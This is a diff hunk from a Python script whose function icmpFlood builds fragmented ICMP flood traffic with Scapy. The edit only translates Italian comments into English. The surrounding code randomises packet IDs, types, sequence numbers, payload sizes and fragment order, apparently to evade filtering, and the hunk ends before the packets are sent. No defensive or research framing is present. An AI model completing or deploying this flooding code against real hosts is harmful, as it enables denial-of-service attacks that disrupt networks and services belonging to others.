@@ -8,11 +8,11 @@ def icmpFlood(targetIp, packetCount):
         for i in range(packetCount):
             payload = bytes([random.randint(0, 255) for _ in range(random.randint(800, 1400))])
             
-            #Pacchetto IP, ICMP with random ID, type and seq
+            #IP/ICMP packet with random ID, type and seq
             packet = IP(dst=targetIp, id=random.randint(1, 65535), flags="MF") / ICMP(type=random.choice([8, 0]), seq=random.randint(1, 65535)) / payload
             
-            #Frammenta il pacchetto in pezzi più piccoli
-            fragmentedPackets = fragment(packet, fragsize=random.randint(64, 128))  #Fragment with variable size
+            #Fragment with variable size
+            fragmentedPackets = fragment(packet, fragsize=random.randint(64, 128))  
             
             #Send fragments in random order with random delays
             random.shuffle(fragmentedPackets)
